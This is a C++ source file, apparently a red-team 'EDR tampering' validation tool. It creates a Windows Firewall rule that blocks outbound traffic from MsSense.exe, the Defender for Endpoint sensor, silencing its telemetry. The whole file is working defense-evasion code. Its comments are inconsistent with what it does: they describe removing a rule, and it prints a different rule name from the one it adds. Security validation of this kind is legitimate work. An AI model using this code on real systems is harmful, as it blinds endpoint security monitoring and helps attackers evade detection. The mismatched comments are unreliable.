// File: 
//    create_fw_rule.cpp
// 
// Author:
//    Jimmi Aylesworth
//
// Date:
//    August 18, 2026
//
// Purpose:
//   Create a specific named Windows Firewall rule (via the INetFwPolicy2 
//   COM interface), to block outbound telemetry for MsSense.exe. 
//   Intended to be run as part of a Security Validation - EDR Tampering.
//
// Behavior:
//   - Requires an elevated (administrator) process token, since firewall
//     policy modification requires admin rights.
//   - Looks up the target rule by exact display name and removes it if
//     present.
//   - Emits clear, distinct exit codes and stderr messages so it can be
//     scripted/orchestrated without needing to parse free-text output.
//
// Exit codes:
//   0  - Rule added successfully
//   1  - Not running elevated
//   2  - COM initialization failure
//   3  - Failed to create INetFwPolicy2 instance
//   4  - Failed to create INetFwRules instance
//
// Build:
//   $ x86_64-w64-mingw32-g++ create_fw_rule.cpp -static-libstdc++ -static-libgcc -lole32 -loleaut32 -o create_fw_rule.exe

#include <windows.h>
#include <netfw.h>
#include <comutil.h>
#include <comdef.h>   // _com_error, for decoding HRESULTs into readable text
#include <cstdio>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// Name of the firewall rule to remove.
static const wchar_t* TargetRuleName = L"AppBlocker-Outbound-MsSense";

// ---------------------------------------------------------------------
// Returns true if the current process is running with an elevated
// (administrator) token. Firewall policy writes require elevation; failing
// fast here with a clear message is more useful than letting COM calls
// fail deeper in the call stack with an opaque E_ACCESSDENIED.
// ---------------------------------------------------------------------
static bool IsProcessElevated()
{
    bool elevated = false;
    HANDLE token = nullptr;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return false;

    TOKEN_ELEVATION elevation{};
    DWORD returnedSize = 0;

    if (GetTokenInformation(token, TokenElevation, &elevation,
                             sizeof(elevation), &returnedSize))
    {
        elevated = (elevation.TokenIsElevated != 0);
    }

    CloseHandle(token);
    return elevated;
}

// ---------------------------------------------------------------------
// Small helper to print an HRESULT with its decoded message, so failures
// are actionable from the console/log rather than just a hex code.
// ---------------------------------------------------------------------
static void PrintHResultError(const char* context, HRESULT hr)
{
    _com_error err(hr);
    fwprintf(stderr, L"[!] %hs failed: 0x%08X - %ls\n",
              context, hr, err.ErrorMessage());
}

int main()
{
    // --- Elevation check -------------------------------------------------
    if (!IsProcessElevated())
    {
        fwprintf(stderr,
            L"[!] This tool must be run elevated (Administrator) to modify "
            L"firewall policy.\n");
        return 1;
    }

    // --- COM initialization ----------------------------------------------
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr))
    {
        PrintHResultError("CoInitializeEx", hr);
        return 2;
    }

    int exitCode = 0;
    INetFwPolicy2* policy = nullptr;

    hr = CoCreateInstance(
        __uuidof(NetFwPolicy2),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(INetFwPolicy2),
        (void**)&policy);

    if (FAILED(hr))
    {
        PrintHResultError("CoCreateInstance(NetFwPolicy2)", hr);
        CoUninitialize();
        return 3;
    }

    // --- FW Rule creation ------------------------------------------------
    INetFwRule* rule = nullptr;

    hr = CoCreateInstance(
        __uuidof(NetFwRule),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(INetFwRule),
        (void**)&rule);

    if (FAILED(hr))
    {
        PrintHResultError("CoCreateInstance(NetFwRule)", hr);
        CoUninitialize();
        return 4;
    }    

    if (SUCCEEDED(hr))
    {
        rule->put_Name(_bstr_t(L"BigBrother-MsSense"));
        rule->put_Description(
            _bstr_t(L"Blocks outbound MsSense"));
        rule->put_Direction(NET_FW_RULE_DIR_OUT);
        rule->put_Action(NET_FW_ACTION_BLOCK);
        rule->put_Enabled(VARIANT_TRUE);

        rule->put_ApplicationName(
            _bstr_t(
                L"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe"));

        INetFwRules* rules = nullptr;

        if (SUCCEEDED(policy->get_Rules(&rules)))
        {
            rules->Add(rule);
            wprintf(L"[+] Added firewall rule: \"%ls\"\n", TargetRuleName);
            rules->Release();
        }

        rule->Release();
        exitCode = 0;
    }

    policy->Release();
    CoUninitialize();

    return exitCode;
}